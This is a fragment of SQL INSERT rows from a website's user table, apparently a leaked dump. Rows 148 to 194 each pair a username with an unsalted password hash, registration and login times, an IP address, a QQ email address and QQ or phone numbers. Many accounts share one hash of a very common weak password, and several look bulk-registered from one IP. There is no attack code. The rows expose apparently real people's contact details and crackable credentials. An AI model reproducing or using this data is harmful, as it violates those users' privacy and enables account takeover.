(148, 'bxlkm', 'b4f6ee9a699ff54141dcc7cfa938b12627a7416d', '2018-02-10 16:00:22', '115.35.20.154', 1.01, 10, '心灵', '', 0, 'bxlkm@qq.com', 0, '7097490', NULL, '2018-02-26 00:17:25', '', 0, 77, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'b4f6ee9a699ff54141dcc7cfa938b12627a7416d', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(149, 'dxyaozi', '7a40bf6d6e42dc7208140972e871d107d1630c9b', '2018-02-26 13:54:36', '115.206.31.103', 490000, 20, '455', '', 0, '1334094881@qq.com', 0, '1334094881', NULL, '2019-01-01 14:40:55', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7a40bf6d6e42dc7208140972e871d107d1630c9b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0473768001557230098', NULL, NULL),
(150, 'admin999', 'dd5fef9c1c1da1394d6d34b248c51be2ad740840', '2018-03-01 15:52:05', '223.96.221.250', 0.01, 10, '朵朵', '', 0, '2110861572@qq.com', 0, '2110861572', NULL, '2018-03-03 22:25:54', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(151, '7787977', 'd496465ee31523caf448a8cab8e109cf7fe41d57', '2018-03-11 16:50:58', '223.88.196.16', 0.01, 10, '7787977', '', 0, '7787977@qq.com', 0, '7787977', NULL, '2018-03-11 16:53:27', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'd496465ee31523caf448a8cab8e109cf7fe41d57', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(152, 'wasdz', '10b2f6b4d03d6c95110f968c471f7ab317b9d885', '2018-03-19 14:30:00', '36.4.202.50', 0.01, 10, 'wasdz', '', 0, '281563612@qq.com', 0, '201563612', NULL, '2018-06-05 22:05:58', '', 0, 65, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '10b2f6b4d03d6c95110f968c471f7ab317b9d885', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(153, '85803437', '3477f4e9eece11134db3c424b8fec1e54978c5b1', '2018-03-27 21:16:56', '14.116.142.63', 0.01, 10, '85803437', '', 0, '85803437@qq.com', 0, '85803437', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '3477f4e9eece11134db3c424b8fec1e54978c5b1', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(154, 'julecn', 'e3817880350fbc9ecc2c3b55e802d51944c8d9b6', '2018-03-28 16:55:52', '119.4.253.191', 0.03, 10, '聚乐之家', '', 0, '189808639@qq.com', 0, '189808639', NULL, '2018-06-05 23:54:44', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'e3817880350fbc9ecc2c3b55e802d51944c8d9b6', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(155, 'ophao123', 'fb0a8929865016ba27349dbfeeaa31a699fb74d5', '2018-04-04 17:24:43', '223.96.96.213', 0.01, 10, '8865', '', 0, '86868@qq.com', 0, '86568', NULL, '2018-04-04 17:24:43', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(156, 'fdsafdsa', 'ff66bda18406f1cd8695a8f9eda7177553c4c586', '2018-04-09 03:05:53', '49.118.221.11', 2.01, 0, 'fdsafdsa', '', 0, 'fdsafdsa@qq.com', 0, 'fdsafdsa', NULL, '2018-04-12 12:23:18', '', 0, 53, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'ff66bda18406f1cd8695a8f9eda7177553c4c586', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(157, 'youyu', 'dd5fef9c1c1da1394d6d34b248c51be2ad740840', '2018-04-14 12:37:43', '123.151.77.81', 0.01, 10, 'youyu', '', 0, '454343@qq.com', 0, '123456', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'dd5fef9c1c1da1394d6d34b248c51be2ad740840', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(158, '117528582', 'faae59237f0174e363aeb20db7427f81a3f250b1', '2018-04-25 17:26:35', '117.67.9.241', 0.01, 10, '117528582', '', 0, '117528582@qq.com', 0, '117528582', NULL, '2018-04-25 17:26:35', '', 0, 259, '7777', 'test', 'test', '<p>test&nbsp;&nbsp;&nbsp;&nbsp;</p>', 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'faae59237f0174e363aeb20db7427f81a3f250b1', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', '7777', '', NULL, NULL, NULL, NULL, NULL, NULL),
(159, '111111', '3d4f2bf07dc1be38b20cd6e46949a1071f9d0e3d', '2018-04-28 07:47:43', '175.169.152.244', -0.000000000223517, 10, '111111', '', 0, '111111@11.11', 0, '111111', NULL, '2018-09-24 11:12:38', '', 0, 118, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '3d4f2bf07dc1be38b20cd6e46949a1071f9d0e3d', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0.01, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(160, 'denghuazun', 'b5ae69258934a98c54a485ccf90150118353968e', '2018-05-01 01:04:54', '175.169.152.244', 0.01, 10, '北峰飞雪', '', 0, '378495@qq.com', 0, '378495', NULL, '2018-05-01 01:05:31', '', 0, 1, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'b5ae69258934a98c54a485ccf90150118353968e', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(161, 'a123456', '601f1889667efaebb33b8c12572835da3f027f78', '2018-05-02 22:44:16', '183.226.21.47', 0.01, 20, '1112', '', 0, '123456798@qq.com', 0, '12546132', NULL, '2018-06-05 22:06:19', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(162, 'zhaoqian', 'fae1b6836167cec93bd284f4c7a621682de1add1', '2018-05-24 16:29:52', '123.133.101.154', 1.01, 10, '11111xxx', '', 0, '13305290@qq.com', 0, '', NULL, '2018-06-05 23:09:26', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'fae1b6836167cec93bd284f4c7a621682de1add1', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(163, '515151', 'ec4f3a4075a9fc33887d5df656f66bbe461408fb', '2018-06-05 21:41:22', '175.2.85.253', 0.01, 10, '515151', '', 0, '515151@qq.com', 0, '515151', NULL, '2018-06-05 21:53:56', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'ec4f3a4075a9fc33887d5df656f66bbe461408fb', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(164, 'qq80040962', 'dc7aed532d31acba0b7605e8a71a20909b689a84', '2018-06-08 10:18:04', '49.221.17.34', 0.01, 10, '牛网团队', '', 0, '80040962@qq.com', 0, '', NULL, '2018-06-08 10:25:11', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'dc7aed532d31acba0b7605e8a71a20909b689a84', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(165, 'ceshiceshi2', '3cc71d8bf10337341997fd3454bedd0fe4eebf73', '2018-06-09 09:41:40', '124.135.235.0', 0.01, 10, 'ceshiceshi2', '', 0, '42343232@2333.com', 0, '3432432', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '3cc71d8bf10337341997fd3454bedd0fe4eebf73', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(166, 'admin0807', '4459d75da2bc346b03b2ca6e72faf9b0206aacb9', '2018-06-09 11:51:06', '222.125.4.59', 0.01, 20, '反反复复', '', 0, '4363463@qq.com', 0, '18481548', NULL, '2018-06-09 11:53:57', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '4459d75da2bc346b03b2ca6e72faf9b0206aacb9', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(167, '123123', '601f1889667efaebb33b8c12572835da3f027f78', '2018-06-10 13:10:35', '58.19.230.80', 0.01, 10, '1255', '', 0, '555412@qq.com', 0, '565455', NULL, '2018-06-10 13:11:56', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(168, 'qq1170119667', '4bee02d8a5d3e35e209ef9e8a12f3f8b9859385f', '2018-06-11 21:53:50', '113.57.245.217', 0.01, 10, 'qq1170119667', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '4bee02d8a5d3e35e209ef9e8a12f3f8b9859385f', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(169, 'admin888', 'eaeb8c1250f18a13b72c212ceb85f4cfc100f817', '2018-06-12 12:24:09', '49.77.1.221', 0.01, 10, 'ceshi', '', 0, '1320255829@qq.com', 0, '1320255829@qq.com', NULL, '2019-10-25 10:54:50', '', 0, 252, 'GGG', 'GGGG', 'GGG', NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'eaeb8c1250f18a13b72c212ceb85f4cfc100f817', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, '2019-10-27 18:44:54', NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0858819001571972090', NULL, NULL),
(170, 'ashatest', '90b70cf8018af2f23266227aa711bc5537e091d4', '2018-06-15 17:04:15', '113.101.62.12', 0.01, 10, 'ashatest', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '90b70cf8018af2f23266227aa711bc5537e091d4', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(171, 'liuchao', '3a001c3d859ad230d2bbf209de4e766c1bc9f365', '2018-06-24 20:27:15', '122.142.178.97', 0.01, 10, '超哥', '', 0, '710200758@qq.com', 0, '7120200758', NULL, '2018-06-24 20:27:17', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(172, 'a123321', '8caa3f8d1a4502281d51e35c78c5329071539290', '2018-07-05 16:18:47', '220.112.121.200', 0.01, 10, 'a123321', '', 0, '171741210@qq.com', 0, '171741210', NULL, '2018-07-05 16:18:47', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '8caa3f8d1a4502281d51e35c78c5329071539290', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(173, 'ewqewq', '33a740b2d1990a453a7fe928d6cdf52d9bc767dd', '2018-07-25 20:35:08', '111.1.220.146', 0.01, 10, 'ewqewq', '', 0, 'ewqewq@qq.com', 0, 'ewqewq', NULL, '2018-08-29 02:27:39', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '33a740b2d1990a453a7fe928d6cdf52d9bc767dd', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(174, '17603424436', 'db899965f0f8ef70be8918cdd7166b7f246fa408', '2018-07-25 23:38:06', '223.104.255.73', 0.01, 10, '17603424436', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'db899965f0f8ef70be8918cdd7166b7f246fa408', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(175, 'cwx123', '1f638a830f1ab0b7faf46cf3d1363c518b903639', '2018-07-26 15:02:38', '110.81.185.251', 0.01, 10, 'cwx123', '', 0, '55555@qq.com', 0, '5555', NULL, '2018-07-26 15:02:39', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1f638a830f1ab0b7faf46cf3d1363c518b903639', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(176, '6AzsBuWdx58Z', 'ae0008b397455d483ea3438d473c742208aea32c', '2018-07-28 22:42:39', '175.2.172.251', 0.01, 10, '6AzsBuWdx58Z', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'ae0008b397455d483ea3438d473c742208aea32c', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(177, 'MdemWR4GDmk5', 'ba1a0e9f1a924283e026c81c063d8ebcab8f913e', '2018-07-28 22:42:39', '175.2.172.251', 0.01, 10, 'MdemWR4GDmk5', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'ba1a0e9f1a924283e026c81c063d8ebcab8f913e', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(178, 'a3v7MGkyryYm', '20b75c6690c647408958ce4df870dc1371ff2b69', '2018-07-28 22:42:39', '175.2.172.251', 0.01, 10, 'a3v7MGkyryYm', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '20b75c6690c647408958ce4df870dc1371ff2b69', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(179, 'g78A6bgXHGx5', 'b1a965a389bb02191a891206a7c6df28e2909c56', '2018-07-28 22:42:39', '175.2.172.251', 0.01, 10, 'g78A6bgXHGx5', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'b1a965a389bb02191a891206a7c6df28e2909c56', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(180, 'tuYmU349gyxN', 'cadb0e5697f1f24d458268f197a15f896ca69ca5', '2018-07-28 22:42:39', '175.2.172.251', 0.01, 10, 'tuYmU349gyxN', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'cadb0e5697f1f24d458268f197a15f896ca69ca5', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(181, 'gdSC8AMG6u63', '5fc90a911a1740646ec15dbebd285568bfedefcc', '2018-07-28 22:42:39', '175.2.172.251', 0.01, 10, 'gdSC8AMG6u63', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '5fc90a911a1740646ec15dbebd285568bfedefcc', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(182, 'MKcCtfWTHy25', '8973f09d47779197af1e504859a73a8f1da0dd88', '2018-07-28 22:42:39', '175.2.172.251', 0.01, 10, 'MKcCtfWTHy25', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '8973f09d47779197af1e504859a73a8f1da0dd88', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(183, 'xsxXa9kbcRMN', '46ebc82245c72f43c5f11271cab2a6ccf4e0625b', '2018-07-28 22:42:39', '175.2.172.251', 0.01, 10, 'xsxXa9kbcRMN', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '46ebc82245c72f43c5f11271cab2a6ccf4e0625b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(184, 'eGk9WftVSpxK', '19541b434a20931c17462c8090233acef3e2670b', '2018-07-28 22:42:39', '175.2.172.251', 0.01, 10, 'eGk9WftVSpxK', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '19541b434a20931c17462c8090233acef3e2670b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(185, 'zVHKrG6dWfMb', '33bf15c4b67774311acfbf215f47c99ae3c8aefc', '2018-07-28 22:42:39', '175.2.172.251', 0.01, 10, 'zVHKrG6dWfMb', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '33bf15c4b67774311acfbf215f47c99ae3c8aefc', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(186, 'wotuwang', '24c1738786d51e465bad7a0562ea853dae9608ec', '2018-07-29 11:32:37', '110.184.76.132', 0.01, 10, 'wotuwang', '', 0, '103674821@qq.com', 0, '103674821', NULL, '2018-07-29 11:32:56', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '24c1738786d51e465bad7a0562ea853dae9608ec', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(187, 'mijer', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2018-07-29 15:43:10', '39.176.69.25', 0.01, 20, 'mijer', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(188, '13113629361', 'bfa5cd47e1e7acc66154a3afd2b4b942f9c05803', '2018-07-31 16:19:47', '113.57.246.85', 0.01, 10, '13113629361', '', 0, '', 0, '2575467', '4364799', '2018-11-07 18:48:29', '', 0, 364, '我的店铺', '手机', '方便回电话', NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'bfa5cd47e1e7acc66154a3afd2b4b942f9c05803', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, '2019-07-31 16:20:42', NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(189, 'dap1', '03d549b09dfe44944fbd548d6d6110ec3147f645', '2018-08-07 14:48:23', '219.82.134.219', 0.01, 10, 'hkh', '', 0, '67567567@qq.com', 0, '786756756', NULL, '2018-08-07 14:48:28', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '03d549b09dfe44944fbd548d6d6110ec3147f645', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(190, 'gift1000', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2018-08-08 17:26:43', '120.37.167.95', 0.01, 10, '546465', '', 0, '6987687867@111.com', 0, '6576576746', NULL, '2018-08-22 01:10:54', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(191, 'yintersss', '68d23d3d0c22ad78b6cecd8ba287b409b929e08a', '2018-08-22 10:05:22', '123.92.219.223', 0.01, 10, 'yintersss', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '68d23d3d0c22ad78b6cecd8ba287b409b929e08a', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(192, '1551154', '30b4fa015e31eadede8b754ef6548c99d83cbda4', '2018-08-24 00:38:53', '175.2.75.151', 0.01, 10, '1551154', '', 0, '1551154@qq.com', 0, '1551154', NULL, '2018-08-24 00:38:53', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '30b4fa015e31eadede8b754ef6548c99d83cbda4', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(193, '646664565', '29f3506e64cc9cf798f16586f9d289d6a08ca21b', '2018-08-29 17:34:42', '223.157.221.28', 0.01, 10, '646664565', '', 0, '646664565@qq.com', 0, '646664565', NULL, '2018-08-29 17:34:42', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '29f3506e64cc9cf798f16586f9d289d6a08ca21b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(194, '123321', '4d9012b4a77a9524d675dad27c3276ab5705e5e8', '2018-08-30 03:25:08', '223.104.254.147', 0.01, 10, '123321', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '4d9012b4a77a9524d675dad27c3276ab5705e5e8', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
